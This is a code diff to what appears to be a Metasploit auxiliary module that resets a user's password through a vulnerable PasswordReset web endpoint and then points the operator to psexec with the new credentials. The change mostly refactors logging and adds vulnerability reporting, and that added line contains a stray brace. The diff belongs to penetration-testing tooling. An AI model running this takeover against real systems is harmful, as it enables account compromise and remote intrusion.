@@ -117,7 +117,8 @@ class Metasploit4 < Msf::Auxiliary
       domain = datastore['DOMAIN']
     end
 
-    vprint_status("#{peer}: sending password reset request for #{domain}\\#{localuser}")
+    full_user = "#{domain}\\#{localuser}"
+    vprint_status("#{peer}: sending password reset request for #{full_user}")
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
       'method' => 'POST',
@@ -138,7 +139,7 @@ class Metasploit4 < Msf::Auxiliary
     )
 
     if !res || res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
-      print_error("#{peer}: Could not reset password for #{domain}\\#{localuser}")
+      print_error("#{peer}: Could not reset password for #{full_user}")
       return
     end
 
@@ -157,10 +158,17 @@ class Metasploit4 < Msf::Auxiliary
     )
 
     if !res || res.body != '{"success":true,"data":{"PasswordResetStatus":0}}'
-      print_error("#{peer}: Could not change #{domain}\\#{localuser}'s password -- is it a domain or local user?")
+      print_error("#{peer}: Could not change #{full_user}'s password -- is it a domain or local user?")
       return
     end
 
-    print_good("#{peer}: Please run the psexec module using #{domain}\\#{localuser}:#{password}")
+    report_vuln(
+      host: ip,
+      port: rport,
+      name: name,
+      info: "Module #{fullname} changed #{domain}}",
+      refs: references
+    )
+    print_good("#{peer}: Please run the psexec module using #{full_user}:#{password}")
   end
 end
